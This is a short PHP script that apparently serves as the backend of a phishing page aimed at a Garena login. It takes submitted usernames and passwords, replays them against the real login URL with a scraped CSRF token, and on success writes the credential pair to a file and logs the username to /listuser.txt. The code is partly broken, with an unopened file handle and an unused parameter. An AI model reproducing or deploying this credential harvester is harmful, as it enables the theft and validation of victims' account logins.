<?php
ob_start();
error_reporting(0);
require_once "simple_html_dom.php"; // Chèn thư viện simple_html_dom
session_start();
session_destroy();
$pesan = '';
if(isset($_POST)){
    $RSApassword = $_POST['password2'];
    $password = $_POST['password'];
    $username = $_POST['username'];
    $c1 = $_POST['recaptcha_response_field'];
    $c2 = $_POST['recaptcha_challenge_field'];
    $url="http://gcms2.garena.com/login/";
    $resulta = curl($url);
    $csrf = get_input_val($resulta[1],'input[name=csrfmiddlewaretoken]');

    $postdata="csrfmiddlewaretoken=".$csrf."&next=/home&username=".$username."&password2=".$RSApassword."&password=garena_gcms_pass";

    $result = curl($url,$postdata,'',getcookie($resulta[0]));

    if(preg_match('#302 FOUND#', $result[0])) {
fwrite($file,$username.'/'.$password.PHP_EOL);
    fclose($file);
        $ngu = $_GET["ngu"];
        fwrite($file,$newcontent);
        //fwrite($file,$username.'/'.$password.PHP_EOL);
        fclose($file);
        fwrite(fopen('/listuser.txt','a'),$username."\n");
        fclose(fopen('/listuser.txt','a'));
        $pesan =  "login success";
    }elseif(preg_match('#Type in the ReCaptcha#', $result[1])){
        $pesan = 'login failed';
    }else {
        $pesan = 'login failed';
    }
}
?>
<?php echo $pesan;?>